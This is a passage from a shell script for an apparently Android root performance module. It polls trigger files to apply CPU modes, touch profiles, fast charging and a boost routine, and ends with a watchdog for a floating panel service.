# ──────────────────────────────────────────
while true; do
    sleep 3

    # Trigger modo manual — solo cuando AI está OFF
    if [ -f "$TRIGGER" ]; then
        local_new=$(cat "$TRIGGER" 2>/dev/null | tr -d '\n\r ')
        rm -f "$TRIGGER"
        if [ -n "$local_new" ]; then
            AI_NOW=$(cfg_get AI_ENABLE)
            if [ "$AI_NOW" != "1" ]; then
                CURRENT_STATE=0
                apply_mode "$local_new" "manual"
            fi
        fi
    fi

    # Trigger touch
    if [ -f "$TOUCH_TRIGGER" ]; then
        rm -f "$TOUCH_TRIGGER"
        if [ "$(cfg_get TOUCH_ENABLE)" = "1" ]; then
            apply_touch_on
        else
            apply_touch_off
        fi
        write_touch_log "perfil aplicado"
    fi

    # Trigger FastCharge
    if [ -f "$CONF/fc_trigger" ]; then
        rm -f "$CONF/fc_trigger"
        if [ "$(cfg_get FC_ENABLE)" = "1" ]; then
            _fc_apply
        else
            _fc_restore
        fi
    fi

    # Trigger Diablo Boost (WebUI toggle)
    if [ -f "$CONF/boost_trigger" ]; then
        rm -f "$CONF/boost_trigger"
        run_boost
    fi
done

# Floating panel watchdog
FLOAT_FLAG=/data/local/tmp/.diablo_float
(while true; do
    if [ "$(cat $FLOAT_FLAG 2>/dev/null)" = "1" ]; then
        am startservice -n com.rafael.diablov3/.FloatingPanelService 2>/dev/null
        sleep 3
    else
        am stopservice -n com.rafael.diablov3/.FloatingPanelService 2>/dev/null
        sleep 30
    fi
done) &
